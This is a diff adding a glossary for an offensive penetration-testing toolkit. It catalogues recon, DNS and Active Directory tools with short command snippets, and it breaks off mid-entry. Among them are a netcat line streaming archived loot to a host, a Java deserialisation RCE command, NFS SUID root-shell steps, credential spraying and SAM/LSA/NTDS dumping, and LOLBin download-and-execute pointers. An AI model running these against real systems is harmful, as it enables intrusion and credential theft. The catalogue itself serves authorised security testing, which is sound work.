@@ -1,0 +1,2255 @@
+
+      ██████╗ ██╗      ██████╗ ███████╗███████╗ █████╗ ██████╗ ██╗   ██╗
+     ██╔════╝ ██║     ██╔═══██╗██╔════╝██╔════╝██╔══██╗██╔══██╗╚██╗ ██╔╝
+     ██║  ███╗██║     ██║   ██║███████╗███████╗███████║██████╔╝ ╚████╔╝ 
+     ██║   ██║██║     ██║   ██║╚════██║╚════██║██╔══██║██╔══██╗  ╚██╔╝  
+     ╚██████╔╝███████╗╚██████╔╝███████║███████║██║  ██║██║  ██║   ██║   
+      ╚═════╝ ╚══════╝ ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   
+
+
+ORIGINAL ######################################################################################
+
+
+INFO ##########################################################################################
+
+info_payloads_all_the_things     - PayloadsAllTheThings - the payload / technique reference repo
+    A local, offline copy of the community PayloadsAllTheThings repo - the
+    go-to catalogue of attack payloads and technique notes organised per
+    vulnerability class. You browse or grep the folder tree on disk; nothing
+    runs. Reach for it once you have found an injection point and need working
+    payloads, WAF-bypass variants and exploitation steps for that specific bug
+    class.
+    • offline clone of swisskyrepo/PayloadsAllTheThings - browse the folders locally
+    • per-vuln dirs: SQL Injection, XSS, SSTI, SSRF, XXE, File Inclusion, Upload Insecure Files, Insecure Deserialization, JWT
+    • each has README payloads, WAF-bypass variants, Intruder lists and exploitation notes
+    • methodology dirs: Active Directory, Cloud - AWS/Azure/GCP, Container, Network Pivoting
+    • grep the tree for a keyword: grep -ri "getRuntime" . to find a gadget or trick
+info_base64                      - encode / decode Base64 strings
+    The standard base64 / basenc command-line tools for encoding and decoding
+    data. Purely local text transformation - feed it a string or file, get the
+    encoded or decoded form back. Used constantly for wrapping payloads
+    (PowerShell -enc), decoding tokens and config values, and moving binary
+    data through text-only channels.
+    • encode: echo -n 'text' | base64   /   base64 file.bin
+    • decode: echo 'dGV4dA==' | base64 -d   (-d / --decode)
+    • -w 0 disables line wrapping (needed when pasting into -enc / curl)
+    • URL-safe alphabet with basenc --base64url; base32 / base16 via basenc
+    • wrap a PowerShell payload: iconv -t UTF-16LE | base64 -w0  ->  powershell -enc
+info_c2_matrix                   - C2 Matrix - comparison of command-and-control frameworks
+    A reference spreadsheet (The C2 Matrix) comparing 40+ command-and-control
+    frameworks on language, channels, OS support, licence and evasion. Nothing
+    executes - you filter and sort it to shortlist an implant that fits the
+    engagement's constraints. Use it in the planning phase before committing
+    to Sliver, Empire, Metasploit or another C2.
+    • side-by-side feature comparison of 40+ command-and-control frameworks
+    • columns: implementation language, C2 channels (HTTP/DNS/SMB/ICMP), OS support, licence, key-exchange, evasion
+    • filter/sort the spreadsheet to pick an implant that fits the engagement's constraints
+    • pairs with the Sliver / Empire modules once you have chosen one
+info_ctf_payloads                - handy CTF payloads and one-liners
+    A curated sheet of copy-paste one-liners for fast wins on CTF and lab
+    machines - reverse shells in several languages, SUID/sudo abuse,
+    capability tricks, file-read and PATH-hijack stubs. Assumes a plain shell
+    with common interpreters and no setup. Reach for it for speed on throwaway
+    targets; use the structured web / exploit modules on real engagements.
+    • curated copy-paste one-liners for quick wins on CTF and lab boxes
+    • reverse shells (bash, nc, python, php, perl), SUID / sudo abuse, capabilities
+    • file-read tricks, PATH hijack stubs, cron abuse, quick enumeration snippets
+    • minimal setup - assume a plain shell with common interpreters only
+info_cyberchef                   - CyberChef - data decode / decrypt / transform recipes
+    A local build of GCHQ's CyberChef - a browser tool for chaining data
+    operations (decode, decrypt, decompress, parse) into a visual 'recipe'.
+    Everything runs client-side offline, so sensitive blobs never leave the
+    box. Use it whenever you have encoded or encrypted data and want to
+    experiment interactively; the Magic operation auto-detects encoding
+    chains.
+    • local build of GCHQ CyberChef, the 'cyber swiss-army knife' - runs offline, no data leaves the box
+    • drag operations into a recipe: From Base64, From Hex, XOR (brute), ROT13, Gunzip, JWT Decode, Magic
+    • "Magic" op auto-detects encoding chains and suggests the next step
+    • drag-drop file input; save recipes as .json; "Bake" applies the chain
+info_engagement_permission       - sample written authorisation / rules of engagement
+    A template authorisation letter / rules-of-engagement document with fields
+    for scope, in- and out-of-scope ranges, test windows, emergency contacts
+    and sign-off. Not a tool - it is the paperwork that must be signed by
+    someone with authority before any testing begins. Open it at the start of
+    every engagement.
+    • template authorisation letter / rules-of-engagement document
+    • fields for scope, in/out-of-scope IP ranges and domains, test windows, emergency contacts, sign-off
+    • get it signed by someone who can authorise it before any testing starts
+info_glossary                    - master glossary of SKELETON modules and pentest structure
+    This reference itself - the master catalogue of every SKELETON module, the
+    launcher controls, and the penetration-testing phase chain. The
+    three-column picker (stage -> module -> run history) and the auto-notes
+    file are explained in the preamble. The catalogue text is shared from
+    data/glossary.txt so the launcher and this page never drift.
+    • this reference: launcher controls, the pentest chain, every module and its switches
+    • preamble explains the three-column picker (stage / module / runs) and the auto-notes file
+    • catalogue text is shared from data/glossary.txt so the launcher and this page cannot drift
+info_grep                        - grep usage, regex and output-filtering cheatsheet
+    A usage and regex cheatsheet for grep - the main tool for filtering and
+    searching text output. Covers context lines, inversion, counting,
+    recursion, PCRE, and extraction patterns (IPs, hashes, tokens). Keep it
+    handy whenever you are sifting scan output, source trees or log files.
+    • context: -A n after, -B n before, -C n around a match
+    • -v invert, -c count, -o print only the match, -n line numbers, -r/-R recurse, -l list files
+    • -i case-insensitive, -E extended regex, -P Perl regex, -w whole word, -f patterns.txt
+    • extract IPs: grep -oE '([0-9]{1,3}\.){3}[0-9]{1,3}' scan.txt | sort -u
+    • -a treat binary as text; --color=always to keep highlighting through a pipe
+info_hacktricks                  - link to the HackTricks methodology book
+    A pointer to the HackTricks methodology book - port-by-port enumeration
+    checklists and privilege-escalation trees for Linux, Windows, cloud and
+    mobile. It is the 'what do I try next' index once you have an open service
+    or a foothold. Reference only; the testing happens in other modules.
+    • pointer to the HackTricks methodology book (book.hacktricks.wiki)
+    • port-by-port enumeration checklists and privesc trees for Linux / Windows / cloud / mobile
+    • use as the 'what do I try next' index for any open service or foothold
+info_linux                       - generic Kali / Linux commands and structure
+    A reference for operating on Linux during an assessment - both running
+    your Kali attack box and living on a compromised host. Covers users and
+    permissions, services, networking, scheduling, filesystem layout,
+    capabilities and triage recipes. Open it right after landing a shell, or
+    when you need exact syntax for a local check.
+    • users / perms: id, sudo -l, getcap -r / 2>/dev/null, find / -perm -4000 2>/dev/null
+    • services: systemctl list-units --type=service, ss -tlnp, journalctl -u name
+    • net: ip a, ip r, ip neigh, resolvectl status; pkg: apt / dpkg -l / apt-file search
+    • scheduling: crontab -l, ls -la /etc/cron*, systemctl list-timers
+    • filesystem layout, capabilities, namespaces and triage recipes
+info_mitre_attack                - MITRE ATT&CK tooling and technique references
+    Tooling and technique references for MITRE ATT&CK - the tactic ->
+    technique -> procedure taxonomy used to describe attacker behaviour. Use
+    it to map each offensive action to a Txxxx ID for the report and the
+    detection discussion, and to find Atomic Red Team tests and Navigator
+    coverage layers.
+    • ATT&CK tactics -> techniques -> sub-techniques -> procedures reference
+    • map each offensive action to a Txxxx ID for the report and detection discussion
+    • links to Atomic Red Team tests (per-technique runnable) and CAR analytics
+    • ATT&CK Navigator layers to show coverage / gaps
+info_phone_codes                 - mobile handset service / diagnostic dial codes
+    A reference list of GSM handset service and diagnostic dial codes (MMI
+    strings) - IMEI display, call-forwarding status, vendor field-test menus.
+    Reference only; nothing is dialled. Useful for mobile-handset engagements
+    and quick device checks.
+    • GSM / handset service and diagnostic dial codes (MMI strings)
+    • IMEI (*#06#), call-forwarding status (*#21#/*#62#), field-test menus per vendor
+    • reference only - no dialing is performed
+info_revshell_generator          - Reverse Shell Generator - build one-liners for any target
+    An offline copy of revshells.com - fill in your listener IP and port once
+    and it produces matching reverse-shell one-liners and listeners for dozens
+    of languages and shells, plus TTY-upgrade snippets and an MSFVenom
+    builder. Runs locally on 127.0.0.1:8139. Use it any time you need a shell
+    payload without memorising syntax.
+    • offline copy of revshells.com - no data leaves the box
+    • fill in LHOST / LPORT once, get matching listener + reverse-shell for bash, sh, nc, ncat, PHP, Python, Perl, Ruby, PowerShell, Golang, Java, Lua, NodeJS, ...
+    • TTY-upgrade snippets, MSFVenom builder, and Windows / Linux payload variants
+    • "run revshells" hosts it locally on 127.0.0.1:8139
+info_tar                         - tar archive create / extract syntax
+    A syntax cheatsheet for tar - creating, listing and extracting archives
+    with the various compression backends, path-stripping, permission
+    preservation and streaming over a network socket. Reach for it when
+    packaging loot, moving directory trees between hosts, or doing a
+    checksum-safe copy.
+    • create: tar czf out.tgz dir/    extract: tar xzf out.tgz -C /dest    list: tar tzf out.tgz
+    • compression: -z gzip, -j bzip2, -J xz, --zstd; -a picks by extension
+    • --strip-components=N drop leading path parts, -p/--preserve-permissions, --exclude=PATTERN
+    • stream over the network: tar czf - dir | nc host 4444    (receiver: nc -lvnp 4444 | tar xzf -)
+    • checksum-safe copy: tar cf - -C src . | tar xpf - -C dst
+info_tmux                        - tmux terminal multiplexer shortcuts
+    A shortcut reference for tmux, the terminal multiplexer. The key point for
+    assessments: detaching and reattaching sessions so long-running scans and
+    shells survive a dropped SSH connection. Covers windows, panes, copy-mode
+    scrollback and synchronised input.
+    • prefix is Ctrl-b: c new window, n/p next/prev, , rename, % / " split, o switch pane, z zoom
+    • [ enters copy mode (scrollback); Space start selection, Enter copy; ] paste
+    • detach with prefix d; reattach with tmux attach -t 0 so long scans survive a dropped SSH session
+    • tmux new -s work, tmux ls, tmux kill-session -t work; :setw synchronize-panes on to type to all panes
+info_windows                     - Windows commands, tooling and structure
+    A reference for Windows commands, built-in tooling and OS structure - user
+    and group enumeration, services and scheduled tasks, networking, registry
+    and WMI queries, and the LOLBins used for download/exec. Open it when
+    working from a Windows shell or planning host enumeration.
+    • users / groups: whoami /all, net user, net localgroup administrators, query user
+    • services / tasks: sc query, wmic service, schtasks /query /fo LIST /v
+    • net: ipconfig /all, route print, arp -a, netstat -ano, netsh wlan show profiles
+    • registry / WMI: reg query, wmic process list full, Get-CimInstance
+    • LOLBins for download / exec: certutil, bitsadmin, mshta, regsvr32, rundll32
+
+OSIN ##########################################################################################
+
+OSIN_bbot                        - BBOT - recursive OSINT / attack-surface scanner
+    BBOT is a recursive OSINT and attack-surface scanner: each finding
+    (subdomain, URL, secret) becomes a new seed until the surface stops
+    growing. It ships ~100 modules (httpx, nuclei, gowitness, bucket
+    enumeration) selectable by flag sets from passive to aggressive. Use it
+    for a broad, automated external-recon sweep that feeds JSON/CSV or Neo4j.
+    • recursive scanner: findings become new seeds until the surface stops growing
+    • bbot -t target.com -p subdomain-enum   (or -f safe / passive / active / aggressive flag sets)
+    • -m modules to add: httpx, nuclei, gowitness, secretsfinder, bucket_aws
+    • -o ./out -y non-interactive; results as JSON / CSV and a Neo4j feed
+    • --list-modules to see the ~100 modules and their flags
+OSIN_dnstwist                    - dnstwist / urlcrazy - lookalike and typosquat domain discovery
+    dnstwist (with urlcrazy as an alternate generator) produces look-alike
+    domain permutations - typos, homoglyphs, bit-flips, TLD swaps - and checks
+    which are registered, resolve, run mail servers or host a copy of the real
+    site. Use it for phishing-infrastructure discovery and brand-abuse /
+    typosquat monitoring.
+    • dnstwist --registered -w -f csv domain.com   - only show ones that resolve, whois too
+    • fuzzers: typos, bit-flips, homoglyphs, TLD swap, hyphenation, insertion, omission
+    • --lsh / --phash flag pages that look like the original; --mxcheck spots mail interception
+    • urlcrazy -f csv domain.com is the alternate generator with typo-frequency scoring
+OSIN_gitleaks                    - gitleaks / trufflehog - secret and credential scanning
+    gitleaks and trufflehog scan code, git history and plain files for
+    committed secrets - API keys, tokens, private keys - using regex and
+    entropy rules. trufflehog can live-verify each finding against the
+    provider. Use them on any repo, CI artefact or dump you obtain to surface
+    working credentials.
+    • gitleaks detect --source . -v            scan working tree + full git history
+    • gitleaks detect --no-git -s ./dir        scan plain files (CI artefacts, dumps)
+    • -c custom.toml extra regex/entropy rules; --redact hide secrets in output; --report-path out.json
+    • trufflehog git https://host/org/repo --only-verified   live-checks each key against the provider
+    • trufflehog github --org=acme  /  filesystem ./dir  /  s3 --bucket=...
+OSIN_projectdiscovery            - ProjectDiscovery suite - subfinder / httpx / dnsx / naabu / katana
+    The ProjectDiscovery suite - subfinder (passive subdomain enum), dnsx
+    (resolution), httpx (HTTP probing), naabu (port scan) and katana (crawler)
+    - small single-purpose tools designed to pipe into each other. Use them as
+    the backbone of an external-recon pipeline from domain to live endpoints.
+    • subfinder -d target.com -all -silent | tee subs.txt        passive, 30+ sources (-all)
+    • dnsx -l subs.txt -a -resp -silent                          resolve, keep live, show records
+    • httpx -l subs.txt -sc -title -tech-detect -ip -cdn         probe: status, title, wappalyzer, CDN
+    • naabu -l hosts.txt -top-ports 1000 -silent                 fast SYN/CONNECT port scan
+    • katana -u https://target -jc -kf all -d 3                  headless crawl for endpoints / JS
+OSIN_reconftw                    - reconFTW - automated end-to-end external recon framework
+    reconFTW is an all-in-one wrapper that chains dozens of recon tools into
+    one run: subdomains, permutations, takeovers, web probing, nuclei,
+    parameter mining and screenshots. Modes range from passive to aggressive;
+    runs are resumable and config-driven. Use it when you want a complete
+    external picture from a single command.
+    • ./reconftw.sh -d target.com -r        full recon (subs, perms, takeovers, web probe, nuclei, params, screenshots)
+    • modes: -p passive only, -s subdomains only, -w web scan on a known list, -a all / aggressive
+    • -l list.txt multi-target, --deep for slower thorough run, -o out/ custom dir
+    • edit reconftw.cfg for API keys, rate limits and which stages run; runs are resumable
+OSIN_amass                       - OWASP Amass - attack-surface and subdomain mapping
+    OWASP Amass maps an organisation's attack surface and subdomains, storing
+    results in a graph database. Passive mode uses CT logs, ASN data and
+    passive DNS with no target traffic; active mode adds resolution, brute
+    force and permutations. amass intel finds seed domains and netblocks from
+    an org name. Use it for thorough, correlated DNS asset discovery.
+    • amass enum -passive -d target.com -o subs.txt              CT logs, ASN, PDNS - no target traffic
+    • amass enum -active -brute -d target.com -w wordlist        add resolution + brute + permutations
+    • -df domains.txt multi-domain; -config config.yaml for API keys; results stored in a graph DB
+    • amass intel -org "Acme" / -asn 12345                       find seed domains and netblocks
+    • amass db -show / amass viz -d3                             query and visualise past runs
+OSIN_general                     - OSINT websites, image / video analysis, searches
+    A hand-picked index of OSINT websites - search engines, breach-data
+    lookups, people search, reverse-image and EXIF tools, geolocation and
+    video-frame analysis - organised like the OSINT Framework to open in a
+    browser. Use it as a launchpad when you need a specific external-research
+    resource.
+    • hand-picked OSINT sites: search engines, breach data (DeHashed, HIBP), people search
+    • reverse-image (Yandex, Google Lens, TinEye), EXIF viewers, geolocation, video frame tools
+    • framework-style index (like the OSINT Framework) to open in a browser
+OSIN_google_dorking              - Google / search-engine dorking operators
+    A reference for search-engine dorking operators (site:, filetype:, inurl:,
+    intitle:, intext: and combinations) with ready examples for exposed files,
+    directory listings and login portals. Also covers Bing, DuckDuckGo and
+    GitHub code-search syntax. Use it to find indexed content the target did
+    not mean to publish.
+    • operators: site: filetype: ext: inurl: intitle: intext: cache: related: AROUND(n) - -exclude "phrase"
+    • exposed files: site:target.com ext:sql | ext:bak | ext:log | ext:env
+    • listings / portals: intitle:"index of" site:target.com   /   inurl:login site:target.com
+    • also works on Bing (instreamset:, ip:), DuckDuckGo and GitHub code search (org: path: filename:)
+OSIN_shodan                      - Shodan - internet-exposed host search engine
+    Shodan is a search engine of internet-exposed hosts, indexing banners,
+    certificates, screenshots and known CVEs. Query by org, netblock, product,
+    title or vulnerability from the CLI; shodan host summarises one IP. Use it
+    for passive external exposure mapping without sending a single packet to
+    the target.
+    • shodan search 'org:"Acme" port:3389' --fields ip_str,port,hostnames
+    • filters: net: ssl.cert.subject.cn: http.title: product: vuln: (CVE) has_screenshot:true country: city:
+    • shodan host 1.2.3.4 (banners, ports, CVEs); shodan domain target.com; shodan count 'apache'
+    • shodan download out 'query' then shodan parse for bulk export; facets for scoping
+OSIN_spiderfoot                  - SpiderFoot - automated OSINT reconnaissance
+    SpiderFoot automates OSINT collection across 200+ modules, correlating
+    domains, IPs, emails, names, breaches and dark-web mentions into a
+    risk-tagged graph. Run it from the web UI or CLI with 'use case' presets
+    (Footprint / Investigate / Passive). Use it for hands-off, wide-net
+    reconnaissance.
+    • sf.py -l 127.0.0.1:5001 for the web UI, or sfcli / python3 sf.py -s target -t DOMAIN_NAME -o csv
+    • 200+ modules correlate domains, IPs, emails, names, breaches, dark-web mentions
+    • scan "use cases": Footprint / Investigate / Passive; per-module API keys in Settings
+    • risk-tagged results, correlation rules and a visual graph
+OSIN_theharvester                - theHarvester - emails, hosts and names from public sources
+    theHarvester pulls emails, subdomains, hostnames and staff names from many
+    public sources (search engines, CT logs, PGP, Shodan) in one command. Fast
+    and shallow - a first pass to seed a subdomain and email list that other
+    tools then expand. Some sources need API keys.
+    • theHarvester -d target.com -b all -l 500                   all sources, cap results
+    • -b bing,crtsh,duckduckgo,otx,rapiddns,subdomaincenter,urlscan (some need API keys)
+    • -f out saves HTML/JSON/XML; -n reverse-DNS the netblock; -c DNS brute; -s Shodan lookup
+    • fast first pass to seed a subdomain / email list
+OSIN_virustotal                  - VirusTotal - file / URL / hash reputation lookup
+    VirusTotal aggregates multi-engine AV verdicts, passive DNS, related files
+    and behavioural data for a file, URL, domain or hash. Query by hash or
+    name to avoid uploading a sensitive sample. Use it in triage to check
+    reputation, find pivots, and (with an API key) run retro-hunts.
+    • vt file <sha256> / vt url <url> / vt domain target.com / vt ip 1.2.3.4  (needs VT_API_KEY)
+    • multi-engine AV verdicts, passive DNS, sibling / communicating files, YARA / behaviour
+    • search by hash or domain to avoid uploading sensitive artefacts; VT Intelligence for retro-hunts
+OSIN_wigle                       - WiGLE - wardriving database of wireless networks
+    WiGLE is a crowdsourced database of wireless networks (SSID, BSSID,
+    location) built from wardriving uploads. Query by SSID, MAC or geographic
+    bounding box via the API to geolocate an access point or list the APs seen
+    at a location. Use it for wireless OSINT and site scoping.
+    • query the crowdsourced Wi-Fi/Bluetooth database by SSID, BSSID/MAC or bounding box
+    • API: /api/v2/network/search?ssid=... or ?netid=<BSSID>; geolocate an AP or list APs at a location
+    • supports wardrive upload (WiGLE app) and KML / CSV export for mapping
+
+DNS ###########################################################################################
+
+DNS_puredns                      - puredns / massdns - mass subdomain brute-force and resolution
+    puredns drives massdns to brute-force and resolve subdomains at very high
+    speed, with automatic wildcard detection so false positives are filtered
+    out. It needs a vetted list of trusted resolvers. Use it when you have a
+    large candidate wordlist and want clean, validated results fast.
+    • puredns bruteforce all.txt target.com -r resolvers.txt -w hits.txt   brute from a wordlist
+    • puredns resolve candidates.txt -r resolvers.txt                      just resolve + clean a list
+    • automatic wildcard detection / filtering kills false positives; --rate-limit to be gentle
+    • built on massdns (-s concurrency); needs a vetted trusted-resolvers list (--resolvers-trusted)
+DNS_axfr                         - dig AXFR zone-transfer test
+    A test for the classic DNS misconfiguration: an authoritative name server
+    that allows an unauthenticated zone transfer (AXFR), dumping every record
+    - including internal hosts and IPs - in one request. Enumerate the NS set,
+    then try AXFR against each. A success is often the fastest possible win.
+    • dig AXFR target.com @ns1.target.com          a misconfigured NS dumps every record at once
+    • enumerate the NS set first: dig +short NS target.com, then try AXFR against each
+    • nslookup: server ns1; set type=any; ls -d target.com     host -l target.com ns1
+    • success -> instant full subdomain + internal-IP list; usually the fastest possible win
+DNS_crtsh                        - crt.sh certificate-transparency subdomain search
+    Queries crt.sh, the Certificate Transparency log search, for every
+    hostname that has ever appeared in a TLS certificate for a domain -
+    including dev and staging names. Fully passive: no traffic reaches the
+    target. One curl-and-jq query seeds a subdomain list.
+    • curl -s 'https://crt.sh/?q=%25.target.com&output=json' | jq -r '.[].name_value' | sort -u
+    • one query returns every name ever put in a TLS cert for the domain (incl. dev / staging)
+    • fully passive - no traffic to the target; also query the crt.sh Postgres directly for wildcards
+DNS_dnsenum                      - dnsenum - DNS records + subdomain brute force
+    dnsenum is an all-in-one DNS recon tool: it pulls the standard records,
+    attempts AXFR on each name server, brute-forces subdomains from a
+    wordlist, and reverse-resolves any netblocks it discovers. XML output for
+    parsing. A solid single-tool first pass on a domain.
+    • dnsenum --enum -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -o out.xml target.com
+    • pulls A/NS/MX/TXT, tries AXFR on each NS, brute-forces subs, reverse-looks-up found netblocks
+    • --threads 20 speed, -r recurse into subdomains, -p/-s scrape Google pages for more names
+    • --dnsserver 8.8.8.8 pin resolver; XML output for parsing
+DNS_dnsmap                       - dnsmap - subdomain brute-force mapper
+    dnsmap is a small, dependency-free subdomain brute-forcer with a built-in
+    wordlist. It flags wildcard responses and interesting IP ranges, and can
+    slow itself with a delay. Use it as a lightweight option when you cannot
+    install heavier tooling.
+    • dnsmap target.com -w wordlist.txt -r /root/dnsmap.txt         built-in list if -w omitted
+    • -c results.csv CSV output, -d 3000 ms delay to slow down, -i ignore a wildcard IP
+    • flags wildcard responses and interesting IP ranges; no external service dependency
+DNS_dnsrecon                     - dnsrecon - full DNS enumeration (AXFR, brute, zonewalk)
+    dnsrecon is a comprehensive DNS enumerator - standard records,
+    zone-transfer attempts, subdomain and reverse-range brute force,
+    NSEC/NSEC3 zone walking, cache snooping and SRV discovery (which surfaces
+    AD service records). Exports JSON, CSV or SQLite. The Swiss-army DNS tool.
+    • dnsrecon -d target.com -t std,axfr           standard records + zone-transfer attempt
+    • -t brt -D subdomains.txt brute; -t rvl -r 10.0.0.0/24 reverse range; -t zonewalk NSEC/NSEC3
+    • -a AXFR only, -s reverse whois, -k cache snooping; -j out.json / --csv out.csv / --db out.sqlite
+    • SRV discovery (-t srv) surfaces _ldap._tcp / _kerberos / _sip service records for AD
+DNS_fierce                       - fierce - DNS recon and subdomain discovery
+    fierce discovers non-contiguous IP space belonging to a target: it tries
+    AXFR, brute-forces names, then walks nearby PTR records and can scan the
+    /24 around each hit. Use it to find the scattered netblocks an
+    organisation actually uses.
+    • fierce --domain target.com --subdomains accounts admin dev mail   or --wordlist list.txt
+    • attempts AXFR on each NS, brute-forces names, then walks nearby PTR records (--traverse N)
+    • --wide scans the whole /24 around each hit; --dns-servers to pin resolvers
+    • good for finding the non-contiguous IP space that belongs to the target
+DNS_links                        - online DNS / reverse-DNS / passive-DNS resources
+    A bookmark list of online DNS, reverse-DNS and passive-DNS services
+    (SecurityTrails, DNSDumpster, ViewDNS, RapidDNS and similar). All lookups
+    run server-side, so nothing touches the target's own name servers. Use
+    them for historical records that reveal origin IPs behind a CDN and past
+    infrastructure.
+    • bookmark list: SecurityTrails, DNSdumpster, ViewDNS, RapidDNS, PassiveTotal, dnshistory
+    • historical A / MX / NS records to spot origin IPs behind a CDN and past infra
+    • all lookups run server-side - nothing touches the target's own name servers
+DNS_nslookup                     - nslookup interactive DNS queries
+    nslookup is the built-in interactive DNS query tool, present on Windows
+    and Linux by default. Do one-shot typed queries or drop into interactive
+    mode to point at a specific server, set the record type and attempt a
+    listing. The lowest-common-denominator DNS client when nothing else is
+    installed.
+    • one-shot: nslookup -type=MX target.com 8.8.8.8   (-type= A/AAAA/NS/TXT/SRV/ANY/PTR)
+    • interactive: nslookup -> server ns1.target.com -> set type=any -> target.com -> ls -d target.com
+    • nslookup 1.2.3.4 for a quick reverse lookup; present on Windows and Linux by default
+DNS_sublist3r                    - Sublist3r - passive subdomain enumeration
+    Sublist3r enumerates subdomains passively from search engines and passive
+    DNS, with an optional brute-force pass. Quick and shallow - a fast first
+    list to combine with subfinder and amass and dedupe. No target contact in
+    the default mode.
+    • sublist3r -d target.com -o subs.txt          search engines + PDNS, no target contact
+    • -b enable the subbrute brute-force pass, -t threads, -p 80,443 port-check the hits, -e pick engines
+    • quick first pass; combine with subfinder / amass and dedupe
+DNS_whois                        - whois domain / netblock registration lookup
+    whois looks up domain and netblock registration data - registrant and org,
+    name servers, dates, abuse contacts, and for IPs the owning organisation,
+    CIDR and ASN. Pivot on the org name, registrant email and name servers to
+    discover related domains and ranges.
+    • whois target.com (registrant/org, NS, created/updated/expiry, abuse contact)
+    • whois 1.2.3.4 -> owning org, CIDR / netrange, ASN; whois -h whois.radb.net '!gAS12345' for prefixes
+    • pivot on the org name, registrant email and name servers to find related domains and ranges
+
+ENUM ##########################################################################################
+
+enum_gpo                         - Group Policy auditing - Grouper2 / Group3r / PowerView
+    Audits Active Directory Group Policy for abuse. Grouper2 parses SYSVOL
+    offline; Group3r does a live LDAP+SYSVOL walk and maps each setting to who
+    it applies to. They surface GPP cpassword, weak GPO ACLs, mapped drives,
+    scheduled tasks and MSI installs. PowerView covers the same ground from
+    PowerShell.
+    • Grouper2 -f \\dc\SYSVOL\domain\Policies -g -o report.html      offline SYSVOL parse
+    • Group3r -f out.log   live LDAP + SYSVOL, maps each setting to who it applies to
+    • finds GPP cpassword, insecure ACLs on the GPO, mapped drives, scheduled tasks, MSI installs, scripts
+    • PowerView: Get-DomainGPO, Get-DomainGPOLocalGroup, Get-DomainGPOUserLocalGroupMapping -Identity user
+enum_java_rmi                    - Java RMI / JMX attacks - remote-method-guesser, beanshooter
+    Attacks Java RMI and JMX services. remote-method-guesser (rmg) lists bound
+    objects, detects known CVEs, brute-forces method signatures and fires
+    deserialization gadget chains for RCE; beanshooter attacks JMX MBeans for
+    MLet class loading and command execution. Use it against an open RMI
+    registry or JMX port.
+    • rmg enum <host> 1090             list bound objects, detect codebase / activation / known CVEs
+    • rmg guess <host> 1090           brute remote method signatures from a wordlist
+    • rmg serial <host> 1090 <bound> CommonsCollections6 'nc ...'   deserialisation RCE
+    • beanshooter enum/deploy/exec <host> 1099   attack JMX MBeans (MLet load, Tomcat creds, command exec)
+enum_netexec                     - NetExec (nxc) - swiss-army knife for AD / SMB / WinRM / MSSQL / LDAP
+    NetExec (nxc, the maintained CrackMapExec fork) sweeps a host or CIDR over
+    SMB, WinRM, LDAP, MSSQL, RDP, SSH and more with a password, NTLM hash or
+    Kerberos ticket. It enumerates shares, users, groups and policy, sprays
+    credentials, dumps SAM/LSA/NTDS and runs modules (lsassy, coercion, gpp).
+    The default first tool against a Windows/AD network.
+    • nxc smb 10.0.0.0/24 -u user -p 'Pass' --shares --users --groups --pass-pol --loggedon-users
+    • auth: -u u -p p  |  -H <NTLM hash> (pass-the-hash)  |  -k (Kerberos)  |  --local-auth
+    • spray: nxc smb targets.txt -u users.txt -p 'Winter2025!' --continue-on-success   (Pwn3d! = local admin)
+    • dump: --sam --lsa --ntds  ;  modules: -M spider_plus / gpp_password / lsassy / nanodump / coerce_plus
+    • protocols: smb winrm ldap mssql ssh rdp ftp vnc wmi; writes ~/.nxc/workspaces SQLite for other tools
+enum_nfs                         - NFS enumeration and privilege abuse (ports 111 / 2049)
+    Enumerates and abuses NFS exports (ports 111/2049). showmount lists
+    exported shares; watch for world-readable exports and no_root_squash,
+    which lets you write a SUID root binary from a machine where you are root
+    and run it back on the target. nfsshell gives raw protocol access with
+    spoofed UID/GID.
+    • showmount -e <host>            list exported shares; watch for * (world) and no_root_squash
+    • rpcinfo -p <host>             confirm mountd / nfs; nmap --script nfs-ls,nfs-showmount
+    • mount -o vers=3 <host>:/export /mnt   then chown / edit files as any UID (useradd locally to match)
+    • no_root_squash -> copy a shell in, chown root, chmod +s, run it back on the target for root
+    • nfsshell for raw protocol access (spoof UID/GID) when mount options are restricted
+enum_voip_sip                    - VoIP / SIP testing - sippts and SIPVicious
+    Tests VoIP / SIP infrastructure with sippts and SIPVicious: find SIP
+    services, fingerprint the PBX, enumerate extensions, crack digest auth,
+    and check for unauthenticated INVITE (toll fraud), REGISTER hijack and
+    caller-ID spoofing. Use it when UDP 5060 or a PBX is in scope.
+    • sippts scan -i 10.0.0.0/24 -p 5060     find SIP services and fingerprint the PBX
+    • sippts exten -i <ip> -r 100-999        enumerate valid extensions; sippts rcrack digest crack
+    • SIPVicious: svmap <range>  ->  svwar -e 100-999 <ip>  ->  svcrack -u 101 -d pass.txt <ip>
+    • test open relay, INVITE without auth (toll fraud), REGISTER hijack, caller-ID spoofing
+enum_ldap                        - LDAP AD enumeration - ldapsearch / windapsearch / pywerview / ADSearch
+    Queries Active Directory over LDAP with ldapsearch, windapsearch,
+    pywerview or ADSearch. Check for anonymous bind, then pull users, groups
+    and computers, and craft filters for Kerberoastable and AS-REP-roastable
+    accounts, unconstrained delegation and readable LAPS passwords. The
+    raw-protocol complement to BloodHound.
+    • ldapsearch -x -H ldap://dc -b "DC=corp,DC=local" -D 'user@corp.local' -w Pass '(objectClass=user)' sAMAccountName
+    • anonymous check: ldapsearch -x -H ldap://dc -s base namingContexts   (then -b "" for RootDSE)
+    • Kerberoastable: '(&(objectClass=user)(servicePrincipalName=*))'  ;  AS-REP: '(userAccountControl:1.2.840.113556.1.4.803:=4194304)'
+    • unconstrained deleg: '(userAccountControl:...=524288)'  ;  dump ms-Mcs-AdmPwd (LAPS) if readable
+    • windapsearch -d corp.local --dc-ip x -U --da ; nxc ldap ... --bloodhound ; ldapdomaindump for HTML
+enum_bashenum                    - bashenum.sh - one-shot local Linux enumeration survey
+    A single self-contained shell script that snapshots a Linux host for
+    privilege-escalation leads - kernel and OS, sudo rights, SUID/SGID
+    binaries, cron, writable PATH, capabilities, sockets, packages and
+    world-writable files. Quiet and dependency-free: the fallback when linpeas
+    is flagged or the host has no network.
+    • single script that snapshots a Linux host for privesc leads: ./bashenum.sh | tee enum.txt
+    • kernel / OS, sudo -l, SUID / SGID (find / -perm -4000), cron, writable PATH dirs, capabilities, dotfiles
+    • network sockets, mounted filesystems, running processes, installed packages, world-writable files
+    • quiet, dependency-free fallback when linpeas is too noisy, flagged, or has no network to self-update
+enum_bloodhound                  - BloodHound - Active Directory attack-path mapping (neo4j)
+    BloodHound ingests Active Directory data (collected by SharpHound,
+    bloodhound-python or nxc) into a Neo4j graph and reveals attack paths -
